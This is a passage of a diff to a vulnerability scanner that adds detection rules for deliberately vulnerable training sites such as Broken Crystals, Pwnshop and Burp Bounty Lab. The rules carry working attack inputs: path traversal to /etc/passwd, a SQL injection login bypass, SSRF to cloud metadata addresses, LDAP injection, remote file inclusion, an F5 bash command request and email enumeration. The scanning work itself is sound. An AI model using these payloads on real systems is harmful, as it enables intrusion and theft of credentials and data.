@@ -7493,6 +7493,42 @@ const burpbountyAiDisclosureLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const burpbountyAiCompletionsLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/ai/v1/completions", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 2048 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const h = doc.headers;
+  const aiHeaders: Record<string, string> = {};
+  for (const key of [
+    "x-ai-backend",
+    "x-llm-provider",
+    "x-rag-provider",
+    "x-mcp-enabled",
+    "x-openai-model",
+    "x-anthropic-model",
+    "x-embedding-model"
+  ]) {
+    const val = (h[key] || "").trim();
+    if (val) aiHeaders[key] = val.slice(0, 80);
+  }
+  if (Object.keys(aiHeaders).length < 2) return NEGATIVE;
+  const hasLegacyCompletion =
+    /"object"\s*:\s*"text_completion"/i.test(doc.body) ||
+    (/"choices"\s*:\s*\[/.test(doc.body) && /"text"\s*:/.test(doc.body));
+  if (!hasLegacyCompletion) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: probeUrl,
+      headers: aiHeaders,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Burp Bounty Lab GET /ai/v1/completions returns legacy text_completion JSON plus LLM gateway headers — OpenAI completions disclosure profile oracle distinct from /ai/v1/chat/completions"
+    }
+  };
+};
+
 const burpbountyRceEvalLiveOracle: Rule = async (ctx) => {
   if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
   const probeUrl = new URL("/rce/eval", ctx.origin);
@@ -7948,6 +7984,28 @@ const burpbountyRedirectPpLiveOracle: Rule = async (ctx) => {
       location,
       snippet: doc.body.slice(0, 120).trim(),
       note: "Burp Bounty Lab GET /redirect/pp?return_url= returns HTTP redirect to attacker URL — post-payment open redirect profile oracle"
+    }
+  };
+};
+
+const burpbountyGitConfigLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/.git/config", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 2048 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const gitConfigOk =
+    /\[core\]/i.test(doc.body) &&
+    /repositoryformatversion/i.test(doc.body) &&
+    /\[remote\s+"origin"\]/i.test(doc.body) &&
+    /url\s*=\s*https?:\/\//i.test(doc.body);
+  if (!gitConfigOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: probeUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Burp Bounty Lab GET /.git/config returns live git repository configuration with remote origin URL — source exposure oracle distinct from generic hub fingerprinting (Content-Type text/html bypasses exposed-git-dir http_probe)"
     }
   };
 };
@@ -8904,6 +8962,243 @@ const burpbountyCitrixCveLiveOracle: Rule = async (ctx) => {
       url: probeUrl,
       snippet: doc.body.slice(0, 160).trim(),
       note: "Burp Bounty Lab GET /cve/citrix/ returns Citrix heading — Citrix ADC CVE profile oracle distinct from generic hub fingerprinting"
+    }
+  };
+};
+
+const burpbountyCrowdCveLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/cve/crowd/", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 1024 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h1>\s*Atlassian\s+Crowd\s*<\/h1>/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: probeUrl,
+      snippet: doc.body.slice(0, 160).trim(),
+      note: "Burp Bounty Lab GET /cve/crowd/ returns Atlassian Crowd heading — Crowd CVE profile oracle distinct from generic hub fingerprinting"
+    }
+  };
+};
+
+const burpbountyFirebaseCveLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/cve/firebase/.json", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 2048 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const users = parsed.users;
+  const config = parsed.config;
+  const debug =
+    config && typeof config === "object" && "debug" in config ?
+      (config as { debug?: unknown }).debug
+    : undefined;
+  const hasAdminUser =
+    users &&
+    typeof users === "object" &&
+    Object.values(users as Record<string, unknown>).some(
+      (entry) =>
+        entry &&
+        typeof entry === "object" &&
+        String((entry as { email?: unknown }).email ?? "").includes("@")
+    );
+  if (!hasAdminUser || debug !== true) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      url: probeUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Burp Bounty Lab GET /cve/firebase/.json returns users with admin email and config.debug=true — Firebase realtime DB CVE profile oracle distinct from generic hub fingerprinting"
+    }
+  };
+};
+
+const burpbountyNetsweeperCveLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/cve/netsweeper/", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 1024 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h1>\s*Netsweeper\s+WebAdmin\s*<\/h1>/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: probeUrl,
+      snippet: doc.body.slice(0, 160).trim(),
+      note: "Burp Bounty Lab GET /cve/netsweeper/ returns Netsweeper WebAdmin heading — Netsweeper CVE profile oracle distinct from generic hub fingerprinting"
+    }
+  };
+};
+
+const burpbountyZohoCveLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/cve/zoho/", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 1024 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h1>\s*ManageEngine\s*<\/h1>/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: probeUrl,
+      snippet: doc.body.slice(0, 160).trim(),
+      note: "Burp Bounty Lab GET /cve/zoho/ returns ManageEngine heading — Zoho ManageEngine CVE profile oracle distinct from generic hub fingerprinting"
+    }
+  };
+};
+
+const burpbountyRubyCveLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/cve/ruby/", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 1024 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h1>\s*Ruby\s+on\s+Rails\s+App\s*<\/h1>/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: probeUrl,
+      snippet: doc.body.slice(0, 160).trim(),
+      note: "Burp Bounty Lab GET /cve/ruby/ returns Ruby on Rails App heading — Rails path-traversal CVE profile oracle distinct from generic hub fingerprinting"
+    }
+  };
+};
+
+const burpbountyWpLfiCveLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/cve/wp/local-file-inclusion", ctx.origin);
+  probeUrl.searchParams.set("file", "../../../etc/passwd");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 4096 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const passwdOk =
+    /root:x:0:0:/.test(doc.body) &&
+    /daemon:x:1:1:daemon:/i.test(doc.body) &&
+    /\/bin\/(?:bash|sh)/.test(doc.body);
+  if (!passwdOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Burp Bounty Lab GET /cve/wp/local-file-inclusion?file=../../../etc/passwd returns /etc/passwd contents — WordPress Duplicator LFI CVE profile oracle distinct from generic hub fingerprinting"
+    }
+  };
+};
+
+const burpbountySharefileCveLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/citrix/sharefile/download", ctx.origin);
+  probeUrl.searchParams.set("path", "../../../windows/win.ini");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 4096 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const winIniOk =
+    /\[fonts\]/i.test(doc.body) &&
+    /\[extensions\]/i.test(doc.body) &&
+    /for 16-bit app support/i.test(doc.body);
+  if (!winIniOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Burp Bounty Lab GET /citrix/sharefile/download?path=../../../windows/win.ini returns win.ini contents — Citrix ShareFile path-traversal CVE profile oracle distinct from generic hub fingerprinting"
+    }
+  };
+};
+
+const burpbountyArticaCveLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/cve/artica/fw.login.php", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 2048 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const articaOk =
+    /Artica\s+Web\s+Proxy/i.test(doc.body) &&
+    /<input[^>]+name=["']apikey["']/i.test(doc.body);
+  if (!articaOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: probeUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Burp Bounty Lab GET /cve/artica/fw.login.php returns Artica Web Proxy login with apikey field — Artica proxy CVE profile oracle distinct from generic hub fingerprinting"
+    }
+  };
+};
+
+const burpbountyMagmiCveLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/cve/magmi/", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 2048 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const magmiOk =
+    /MAGMI\s+Utils\s+JS/i.test(doc.body) && /var\s+magmi\s*=/i.test(doc.body);
+  if (!magmiOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: probeUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Burp Bounty Lab GET /cve/magmi/ returns MAGMI Utils JS — Magento MAGMI plugin CVE profile oracle distinct from generic hub fingerprinting"
+    }
+  };
+};
+
+const burpbountyF5BashCveLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/cve/f5/", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 1024 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h1>\s*F5\s+BIG-IP\s*<\/h1>/i.test(doc.body)) return NEGATIVE;
+  const bashUrl = new URL("/mgmt/tm/util/bash", ctx.origin).toString();
+  const bashDoc = await ctx.probe.get(bashUrl, {
+    method: "POST",
+    body: JSON.stringify({ command: "id" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512
+  });
+  const bashMgmtOk =
+    bashDoc.status === 401 ||
+    /Unauthorized/i.test(bashDoc.body) ||
+    /BIG-IP|tm\.util\.bash/i.test(bashDoc.body);
+  if (!bashMgmtOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      url: probeUrl,
+      bashUrl,
+      bashStatus: bashDoc.status,
+      snippet: doc.body.slice(0, 120).trim(),
+      note: "Burp Bounty Lab GET /cve/f5/ returns F5 BIG-IP heading and /mgmt/tm/util/bash exposes management API — F5 bash RCE CVE profile oracle distinct from generic hub fingerprinting"
+    }
+  };
+};
+
+const burpbountyNetsweeperSystemstatusCveLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/webadmin/tools/systemstatus_remote.php", ctx.origin).toString();
+  const doc = await ctx.probe.get(probeUrl, { maxBytes: 1024 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<h1>\s*System\s+Status\s*<\/h1>/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: probeUrl,
+      snippet: doc.body.slice(0, 160).trim(),
+      note: "Burp Bounty Lab GET /webadmin/tools/systemstatus_remote.php returns System Status heading — Netsweeper systemstatus CVE profile oracle distinct from generic hub fingerprinting"
     }
   };
 };
@@ -16001,6 +16296,92 @@ const CLIENT_VULN_EXPOSE_RES: { label: string; re: RegExp }[] = [
     re: /vuln-expose\.vercel\.app|vulns-expose\.jveltri\.com\.ar/i
   }
 ];
+
+const vulnExposeAuthBypassApiLiveOracle: Rule = async (ctx) => {
+  if (!/vuln-expose\.vercel\.app|vulns-expose\.jveltri\.com\.ar/i.test(ctx.origin)) return NEGATIVE;
+  const loginUrl = new URL("/api/auth/login", ctx.origin).toString();
+  const payload = JSON.stringify({ username: "admin' OR '1'='1", password: "x" });
+  const doc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: payload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 60000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!/"success"\s*:\s*true/i.test(doc.body)) return NEGATIVE;
+  if (!/"role"\s*:\s*"admin"/i.test(doc.body)) return NEGATIVE;
+  if (!/"username"\s*:\s*"admin"/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: loginUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "VulnSite POST /api/auth/login accepts SQLi username admin' OR '1'='1 and returns authenticated admin session — authentication-bypass API oracle"
+    }
+  };
+};
+
+const vulnExposeSqliSearchApiLiveOracle: Rule = async (ctx) => {
+  if (!/vuln-expose\.vercel\.app|vulns-expose\.jveltri\.com\.ar/i.test(ctx.origin)) return NEGATIVE;
+  const searchUrl = new URL("/api/search", ctx.origin);
+  searchUrl.searchParams.set("q", "test");
+  const doc = await ctx.probe.get(searchUrl.toString(), { maxBytes: 8192, timeoutMs: 60000 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!/"query"\s*:\s*"SELECT/i.test(doc.body)) return NEGATIVE;
+  if (!/"vulnerabilities"\s*:/.test(doc.body)) return NEGATIVE;
+  if (!/"union_select"|union_based|boolean_based/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: searchUrl.toString(),
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "VulnSite GET /api/search?q=test echoes raw SQL query and documents UNION/boolean injection vectors — SQL injection search API oracle"
+    }
+  };
+};
+
+const vulnbankAiAnonymousChatLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const chatUrl = new URL("/api/ai/chat/anonymous", ctx.origin).toString();
+  const payload = JSON.stringify({ message: "What banking services do you offer?" });
+  const doc = await ctx.probe.get(chatUrl, {
+    method: "POST",
+    body: payload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 8192,
+    timeoutMs: 20000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const mode = String(parsed.mode ?? "");
+  const status = String(parsed.status ?? "");
+  const warning = String(parsed.warning ?? "");
+  const aiResponse = parsed.ai_response;
+  if (mode !== "anonymous" || status !== "success") return NEGATIVE;
+  if (!/no authentication|demo purposes only/i.test(warning)) return NEGATIVE;
+  if (!aiResponse || typeof aiResponse !== "object") return NEGATIVE;
+  const model = String((aiResponse as { model?: unknown }).model ?? "");
+  const response = String((aiResponse as { response?: unknown }).response ?? "");
+  if (!model || response.length < 8) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: chatUrl,
+      model,
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "Vuln Bank POST /api/ai/chat/anonymous returns mode:anonymous success with LLM response and no-auth warning — unauthenticated AI customer-support oracle"
+    }
+  };
+};
 
 const clientSideVulnExposeEvidence: Rule = async (ctx) => {
   const pageUrl = ctx.home.finalUrl || ctx.origin;
@@ -24405,6 +24786,74 @@ const pwnshopEventsAuditLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const pwnshopChatInitEmailEnumerationLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const url = new URL("/chat/init", ctx.origin).toString();
+  const missingEmail = `thugir-notfound-${Date.now()}@example.com`;
+  const missingDoc = await ctx.probe.get(url, {
+    method: "POST",
+    body: JSON.stringify({ email: missingEmail }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048
+  });
+  if (missingDoc.status < 200 || missingDoc.status >= 300) return NEGATIVE;
+  if (!/"found"\s*:\s*false/i.test(missingDoc.body)) return NEGATIVE;
+  const knownDoc = await ctx.probe.get(url, {
+    method: "POST",
+    body: JSON.stringify({ email: "admin@pwnshop.com" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048
+  });
+  if (knownDoc.status < 200 || knownDoc.status >= 300) return NEGATIVE;
+  if (!/"found"\s*:\s*true/i.test(knownDoc.body)) return NEGATIVE;
+  if (!/"user"\s*:\s*\{/.test(knownDoc.body) || !/"email"\s*:/.test(knownDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url,
+      missingEmail,
+      missingSnippet: missingDoc.body.slice(0, 120).trim(),
+      knownSnippet: knownDoc.body.slice(0, 200).trim(),
+      note: "Pwnshop POST /chat/init returns found:true with user profile for registered emails and found:false for unknown addresses — username enumeration (PWN-037)"
+    }
+  };
+};
+
+const pwnshopForgotPasswordEmailEnumerationLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const url = new URL("/forgot-password", ctx.origin).toString();
+  const missingEmail = `thugir-notfound-${Date.now()}@example.com`;
+  const missingDoc = await ctx.probe.get(url, {
+    method: "POST",
+    body: `email=${encodeURIComponent(missingEmail)}`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 8192
+  });
+  if (missingDoc.status < 200 || missingDoc.status >= 400) return NEGATIVE;
+  if (!/no account found/i.test(missingDoc.body)) return NEGATIVE;
+  const knownDoc = await ctx.probe.get(url, {
+    method: "POST",
+    body: "email=admin%40pwnshop.com",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 8192
+  });
+  if (knownDoc.status < 200 || knownDoc.status >= 400) return NEGATIVE;
+  if (!/password reset link has been sent/i.test(knownDoc.body)) return NEGATIVE;
+  if (!/admin@pwnshop\.com/i.test(knownDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url,
+      missingEmail,
+      missingSnippet: missingDoc.body.match(/alert-err[^<]*<\/i>\s*([^<]+)/i)?.[1]?.trim() ?? "",
+      knownSnippet: knownDoc.body.match(/alert-ok[^<]*<\/i>\s*([^<]+)/i)?.[1]?.trim() ?? "",
+      note: "Pwnshop POST /forgot-password returns distinct success vs no-account messages for registered vs unknown emails — password-reset enumeration oracle"
+    }
+  };
+};
+
 // --- VulnForge Academy gamified OWASP training (vulnforge-academy.vercel.app) -------
 const CLIENT_VULNFORGE_ACADEMY_RES: { label: string; re: RegExp }[] = [
   {
@@ -31980,6 +32429,564 @@ const clientSideBrokencrystalsEvidence: Rule = async (ctx) => {
   };
 };
 
+const brokencrystalsGotoOpenRedirectLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const probeUrl = new URL("/api/goto", ctx.origin);
+  probeUrl.searchParams.set("url", OPEN_REDIRECT_PROBE);
+  const doc = await ctx.probe.get(probeUrl.toString(), {
+    maxBytes: 2048,
+    redirect: "manual",
+    timeoutMs: 8000
+  });
+  const location = doc.headers["location"] || "";
+  if (![301, 302, 303, 307, 308].includes(doc.status)) return NEGATIVE;
+  if (!resolvesToOpenRedirectProbe(location, ctx.origin)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: probeUrl.toString(),
+      status: doc.status,
+      location,
+      snippet: doc.body.slice(0, 120).trim(),
+      note: "Broken Crystals GET /api/goto?url= returns HTTP redirect to attacker-controlled URL — unvalidated open redirect oracle"
+    }
+  };
+};
+
+const brokencrystalsAwsMetadataSsrfLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const probeUrl = new URL("/api/file/aws", ctx.origin);
+  probeUrl.searchParams.set("path", "http://169.254.169.254/latest/meta-data/");
+  probeUrl.searchParams.set("type", "image/jpg");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 4096 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const metadataOk =
+    /ami-id/i.test(doc.body) &&
+    /instance-id/i.test(doc.body) &&
+    /local-ipv4/i.test(doc.body);
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Broken Crystals GET /api/file/aws?path=http://169.254.169.254/latest/meta-data/ returns AWS instance metadata — cloud SSRF oracle"
+    }
+  };
+};
+
+const brokencrystalsAzureMetadataSsrfLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const probeUrl = new URL("/api/file/azure", ctx.origin);
+  probeUrl.searchParams.set(
+    "path",
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+  );
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const metadataOk =
+    /"compute"\s*:/i.test(doc.body) &&
+    /azEnvironment/i.test(doc.body) &&
+    /AZUREPUBLICCLOUD|location/i.test(doc.body);
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Broken Crystals GET /api/file/azure?path=http://169.254.169.254/metadata/instance returns Azure IMDS compute metadata — cloud SSRF oracle distinct from AWS /api/file/aws"
+    }
+  };
+};
+
+const brokencrystalsLdapInjectionLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const ldapUrl = new URL("/api/users/ldap", ctx.origin);
+  ldapUrl.searchParams.set("query", "(&(objectClass=person)(objectClass=user)(email=*))");
+  const doc = await ctx.probe.get(ldapUrl.toString(), {
+    maxBytes: 131072,
+    timeoutMs: 20000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  const body = doc.body.trim();
+  if (!body.startsWith("[")) return NEGATIVE;
+  let resultCount = 0;
+  try {
+    const parsed = JSON.parse(body) as unknown[];
+    if (Array.isArray(parsed)) resultCount = parsed.length;
+  } catch {
+    resultCount = (body.match(/\{\}/g) || []).length;
+  }
+  if (resultCount < 5) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: ldapUrl.toString(),
+      resultCount,
+      snippet: body.slice(0, 200).trim(),
+      note: "Broken Crystals GET /api/users/ldap?query=(&(objectClass=person)(objectClass=user)(email=*)) returns LDAP directory entries — LDAP injection oracle"
+    }
+  };
+};
+
+const BROKENCRYSTALS_SAFE_FILES_RFI_PROBE = {
+  name: "thugir-rfi-probe",
+  url: "https://filedealer.nexploit.app/rfi.md5.txt",
+  content: "245cc0a508bf7f0ff754c84c0fe0b5bc"
+} as const;
+
+const brokencrystalsSecretsLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const secretsUrl = new URL("/api/secrets", ctx.origin).toString();
+  const doc = await ctx.probe.get(secretsUrl, { maxBytes: 8192 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const markers: { label: string; sample: string }[] = [];
+  const slack = parsed.slack;
+  if (typeof slack === "string" && /^xox[aboprs]-/i.test(slack)) {
+    markers.push({ label: "Slack token", sample: slack.slice(0, 24) });
+  }
+  const facebook = parsed.facebook;
+  if (typeof facebook === "string" && /^EAAC/i.test(facebook)) {
+    markers.push({ label: "Facebook token", sample: facebook.slice(0, 24) });
+  }
+  const googleOauth = parsed.google_oauth;
+  if (typeof googleOauth === "string" && /\.apps\.googleusercontent\.com$/i.test(googleOauth)) {
+    markers.push({ label: "Google OAuth client", sample: googleOauth.slice(0, 40) });
+  }
+  const paypal = parsed.paypal;
+  if (typeof paypal === "string" && /access_token/i.test(paypal)) {
+    markers.push({ label: "PayPal access token", sample: paypal.slice(0, 40) });
+  }
+  const codeclimate = parsed.codeclimate;
+  if (typeof codeclimate === "string" && /CODECLIMATE_REPO_TOKEN=/i.test(codeclimate)) {
+    markers.push({ label: "CodeClimate token", sample: codeclimate.slice(0, 40) });
+  }
+  if (markers.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: markers.length >= 3 ? 0.94 : 0.92,
+    evidence: {
+      url: secretsUrl,
+      markers: markers.slice(0, 4),
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Broken Crystals GET /api/secrets returns multiple live API tokens (Slack, OAuth, payment keys) without authentication — secrets exposure oracle"
+    }
+  };
+};
+
+const brokencrystalsSafeFilesRfiLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const safeFilesUrl = new URL("/api/safe-files", ctx.origin).toString();
+  const payload = JSON.stringify({
+    name: BROKENCRYSTALS_SAFE_FILES_RFI_PROBE.name,
+    url: BROKENCRYSTALS_SAFE_FILES_RFI_PROBE.url
+  });
+  const doc = await ctx.probe.get(safeFilesUrl, {
+    method: "POST",
+    body: payload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let parsed: { name?: unknown; url?: unknown; content?: unknown } | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as { name?: unknown; url?: unknown; content?: unknown };
+  } catch {
+    return NEGATIVE;
+  }
+  const content = typeof parsed.content === "string" ? parsed.content.trim() : "";
+  const url = typeof parsed.url === "string" ? parsed.url : "";
+  if (url !== BROKENCRYSTALS_SAFE_FILES_RFI_PROBE.url) return NEGATIVE;
+  if (content !== BROKENCRYSTALS_SAFE_FILES_RFI_PROBE.content) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: safeFilesUrl,
+      remoteUrl: url,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Broken Crystals POST /api/safe-files fetches attacker-controlled URLs and returns remote file content — remote file inclusion oracle"
+    }
+  };
+};
+
+const brokencrystalsUsersSearchExposureLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const searchUrl = new URL("/api/users/search/", ctx.origin).toString();
+  const doc = await ctx.probe.get(searchUrl, { maxBytes: 65536 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let users: Record<string, unknown>[] = [];
+  try {
+    const parsed = JSON.parse(doc.body) as unknown;
+    if (!Array.isArray(parsed)) return NEGATIVE;
+    users = parsed.filter((entry): entry is Record<string, unknown> => !!entry && typeof entry === "object");
+  } catch {
+    return NEGATIVE;
+  }
+  if (users.length < 2) return NEGATIVE;
+  const piiRows = users.filter(
+    (user) =>
+      typeof user.cardNumber === "string" &&
+      /\d{4}/.test(user.cardNumber) &&
+      typeof user.phoneNumber === "string" &&
+      /\+?\d/.test(user.phoneNumber)
+  );
+  if (piiRows.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: piiRows.length >= 5 ? 0.94 : 0.92,
+    evidence: {
+      url: searchUrl,
+      exposedUsers: piiRows.length,
+      sampleEmail: String(piiRows[0].email ?? "").slice(0, 80),
+      snippet: doc.body.slice(0, 220).trim(),
+      note: "Broken Crystals GET /api/users/search/ returns cardNumber and phoneNumber for multiple users without authentication — excessive data exposure oracle"
+    }
+  };
+};
+
+const brokencrystalsTestimonialsSqliLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const url = new URL("/api/testimonials/count", ctx.origin);
+  url.searchParams.set("query", "select count(table_name) as count from information_schema.tables");
+  const doc = await ctx.probe.get(url.toString(), { maxBytes: 128 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  const body = doc.body.trim();
+  if (!/^\d{2,4}$/.test(body)) return NEGATIVE;
+  const count = parseInt(body, 10);
